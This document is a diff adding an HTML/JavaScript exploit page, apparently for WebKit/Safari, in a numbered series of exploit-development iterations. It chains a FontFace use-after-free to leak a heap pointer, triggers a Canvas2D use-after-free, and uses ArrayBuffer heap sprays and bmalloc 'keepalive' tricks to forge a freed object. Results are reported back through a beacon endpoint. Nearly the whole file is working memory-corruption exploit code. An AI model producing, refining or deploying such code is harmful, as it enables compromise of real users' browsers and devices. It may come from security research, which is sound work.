@@ -1,0 +1,253 @@
+<!--
+  p649h: Canvas2D forge — T keepalive + zero delay
+
+  p649d-g all crash on lineWidth getter. Every alignment and zone-size
+  variant crashes. The forge pattern is correct (m_buffer=T, m_size=1).
+
+  ROOT CAUSE HYPOTHESIS: T (freed HashTable, 80B class) is decommitted
+  by bmalloc's scavenger thread during the 250ms setTimeout. Reading
+  from T → SIGBUS (no physical page).
+
+  FIX:
+  1. Spray AB(80) during FontFace trap → reclaim T's bmalloc slot → page stays resident
+  2. setTimeout(0) instead of 250 → minimize window for scavenger
+  3. Retain AB(80) array → prevent GC from freeing them
+
+  Zone 1 (0-639): every qword = T (covers all m_buffer alignments)
+  Zone 2 (640-767): every dword = 1 (covers m_size)
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p649h</title></head>
+<body>p649h: keepalive forge
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+var retained = [];
+
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 2) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 4).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P649H-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+
+var f64 = new Float64Array(1);
+var u8f = new Uint8Array(f64.buffer);
+function d2hex(d) {
+  f64[0] = d;
+  var h = '';
+  for (var i = 7; i >= 0; i--) h += ('0' + u8f[i].toString(16)).slice(-2);
+  return h;
+}
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+emit('START', navigator.userAgent ? navigator.userAgent.slice(0,60) : 'no-ua');
+flush();
+
+// ================================================================
+// PHASE 1: FontFace UAF → leak T + KEEPALIVE spray
+// ================================================================
+var ffA = new FontFace('ff0', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+document.fonts.add(ffA);
+void ffA.loaded;
+retained.push(ffA);
+
+var ffStyle = document.createElement('style');
+ffStyle.textContent = "@font-face { font-family: ffs0; src: local(Arial); unicode-range: U+0042; }";
+document.head.appendChild(ffStyle);
+
+var ffFired = false;
+var ffBufs = [];
+var keepalive80 = [];  // Keep T's bmalloc page alive
+
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (ffFired) return undefined;
+    ffFired = true;
+    ffStyle.remove();
+    try { document.fonts.delete(this); } catch(e) {}
+    document.body.offsetHeight;
+
+    // Reclaim CSSFontFace (192B)
+    for (var i = 0; i < 64; i++) {
+      var ab = new ArrayBuffer(192);
+      ffBufs.push(new Uint8Array(ab));
+    }
+
+    // KEEPALIVE: spray 80B class to keep T's page resident
+    // T points to freed HashTable (80B class in bmalloc)
+    // This spray reclaims T's slot → page stays mapped
+    for (var i = 0; i < 256; i++) {
+      var ab = new ArrayBuffer(80);
+      keepalive80.push(new Uint8Array(ab));
+    }
+
+    return undefined;
+  },
+  set: function() {}
+});
+
+document.fonts.load('1em ff0, ffs0', 'AB');
+
+// ZERO DELAY — minimize scavenger window
+setTimeout(function() {
+try {
+  // Retain keepalive buffers
+  retained.push(keepalive80);
+
+  var T_lo = 0, T_hi = 0;
+  var ffHit = -1;
+
+  for (var i = 0; i < ffBufs.length; i++) {
+    var v = ffBufs[i];
+    var nonzero = 0;
+    for (var j = 0; j < 192; j++) if (v[j] !== 0) nonzero++;
+    if (nonzero > 0) {
+      ffHit = i;
+      var dv = new DataView(v.buffer);
+      T_lo = dv.getUint32(0x58, true);
+      T_hi = dv.getUint32(0x5C, true);
+      emit('FF-HIT', 'buf[' + i + '] T=0x' + hex32(T_hi) + hex32(T_lo));
+      break;
+    }
+  }
+  if (ffHit < 0) {
+    emit('FF-MISS', 'ABORT');
+    flush();
+    return;
+  }
+
+  // Check if any keepalive80 was written to (near T)
+  var ka_hit = 0;
+  for (var i = 0; i < keepalive80.length; i++) {
+    var nz = 0;
+    for (var j = 0; j < 80; j++) if (keepalive80[i][j] !== 0) nz++;
+    if (nz > 0) ka_hit++;
+  }
+  emit('KA', ka_hit + '/256 hit (80B keepalive)');
+  flush();
+
+  // ================================================================
+  // PHASE 2: Canvas2D UAF — DETACHED canvas
+  // ================================================================
+  var uafCanvas = document.createElement('canvas');
+  uafCanvas.width = 1; uafCanvas.height = 1;
+
+  var innerCtx = null;
+  var gFired = false;
+  var cvOpts = {};
+  Object.defineProperty(cvOpts, 'alpha', {
+    get: function() {
+      gFired = true;
+      innerCtx = uafCanvas.getContext('2d');
+      return true;
+    }
+  });
+
+  try { uafCanvas.getContext('bitmaprenderer', cvOpts); } catch(e) {}
+
+  emit('CV-UAF', 'ok=' + gFired + ' inner=' + !!innerCtx);
+  flush();
+  if (!innerCtx) { emit('ABORT', 'no ctx'); flush(); return; }
+
+  // ================================================================
+  // PHASE 3: AB(768) spray — WIDE ZONE 1
+  // Zone 1 (0-639): every qword = T
+  // Zone 2 (640-767): every dword = 1
+  // ================================================================
+  var AB_N = 300;
+  var abViews = [];
+
+  var tmpl = new ArrayBuffer(768);
+  var tmplDV = new DataView(tmpl);
+  var tmplU8 = new Uint8Array(tmpl);
+
+  for (var off = 0; off < 640; off += 8) {
+    tmplDV.setUint32(off, T_lo, true);
+    tmplDV.setUint32(off + 4, T_hi, true);
+  }
+  for (var off = 640; off < 768; off += 4) {
+    tmplDV.setUint32(off, 1, true);
+  }
+
+  for (var i = 0; i < AB_N; i++) {
+    var ab = new ArrayBuffer(768);
+    new Uint8Array(ab).set(tmplU8);
+    abViews.push(new Uint8Array(ab));
+    retained.push(ab);
+  }
+
+  emit('SPRAY', AB_N + ' wide T=0x' + hex32(T_hi) + hex32(T_lo));
+  flush();
+
+  // ================================================================
+  // PHASE 4: GETTER reads
+  // ================================================================
+  emit('G1', 'lineWidth');
+  flush();
+  var lwOk = false;
+  try {
+    var lw = innerCtx.lineWidth;
+    lwOk = true;
+    emit('LW', lw + ' h=' + d2hex(lw));
+  } catch(e) {
+    emit('LW', 'EXC:' + String(e).slice(0,40));
+  }
+  flush();
+
+  if (lwOk) {
+    emit('G2', 'miterLimit');
+    flush();
+    try { emit('ML', innerCtx.miterLimit + ' h=' + d2hex(innerCtx.miterLimit)); } catch(e) { emit('ML', 'X'); }
+
+    emit('G3', 'globalAlpha');
+    flush();
+    try { emit('GA', innerCtx.globalAlpha + ' h=' + d2hex(innerCtx.globalAlpha)); } catch(e) { emit('GA', 'X'); }
+
+    emit('G4', 'getTransform');
+    flush();
+    try {
+      var t = innerCtx.getTransform();
+      emit('XF', 'a=' + d2hex(t.a) + ' b=' + d2hex(t.b) + ' c=' + d2hex(t.c));
+      emit('XF2', 'd=' + d2hex(t.d) + ' e=' + d2hex(t.e) + ' f=' + d2hex(t.f));
+    } catch(e) { emit('XF', 'EXC:' + String(e).slice(0,40)); }
+
+    emit('G5', 'shadow+ldo');
+    flush();
+    try { emit('SB', innerCtx.shadowBlur + ' h=' + d2hex(innerCtx.shadowBlur)); } catch(e) { emit('SB', 'X'); }
+    try { emit('SOX', innerCtx.shadowOffsetX); emit('SOY', innerCtx.shadowOffsetY); } catch(e) { emit('SO', 'X'); }
+    try { emit('LDO', innerCtx.lineDashOffset + ' h=' + d2hex(innerCtx.lineDashOffset)); } catch(e) { emit('LDO', 'X'); }
+    flush();
+
+    // Scan for modified ABs
+    var modAB = -1;
+    for (var ai = 0; ai < abViews.length; ai++) {
+      var v = abViews[ai];
+      for (var off = 0; off < 768; off++) {
+        if (v[off] !== tmplU8[off]) { modAB = ai; break; }
+      }
+      if (modAB >= 0) break;
+    }
+    emit('MOD', modAB >= 0 ? 'AB[' + modAB + ']' : 'none');
+    flush();
+  }
+
+  emit('DONE', lwOk ? 'FORGE-OK' : 'getter-crashed');
+  flush();
+
+} catch(topErr) { emit('FATAL', String(topErr).slice(0,200)); flush(); }
+}, 0);  // ZERO DELAY
+})();
+</script>
+</body></html>
